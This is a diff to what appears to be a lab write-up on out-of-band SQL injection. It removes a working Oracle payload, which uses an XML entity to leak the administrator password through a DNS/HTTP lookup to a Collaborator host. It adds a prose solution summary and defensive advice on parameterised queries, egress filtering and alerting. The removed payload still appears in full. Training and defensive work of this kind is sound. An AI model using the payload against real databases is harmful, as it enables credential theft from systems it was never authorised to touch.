@@ -6,20 +6,10 @@
 
 **Goal:** Exfiltrate the administrator password via out-of-band channel (DNS/HTTP to Collaborator).
 
-## Technique
+## Official solution summary
 
-Embed the data into a DNS lookup or HTTP request to your Collaborator server.
+This lab extends out-of-band interaction to demonstrate that query results can influence an external interaction. The official solution retrieves the administrator's password through the lab's required Burp Collaborator service, then verifies the credentials by logging in.
 
-## Typical Oracle Payload
+## Defensive takeaways
 
-```
-' AND EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-COLLABORATOR-ID.oastify.com/"> %remote;]>'),'/l')='a
-```
-
-Or using UTL_HTTP / DBMS_LDAP etc.
-
-The password will appear in the Collaborator interactions as a subdomain or in the request.
-
-## Notes
-
-Requires Burp Suite Professional with Collaborator client.
+Do not construct SQL from untrusted input. Restrict outbound network access from database servers, avoid storing credentials in recoverable plaintext, and alert on unexpected external DNS or HTTP traffic.
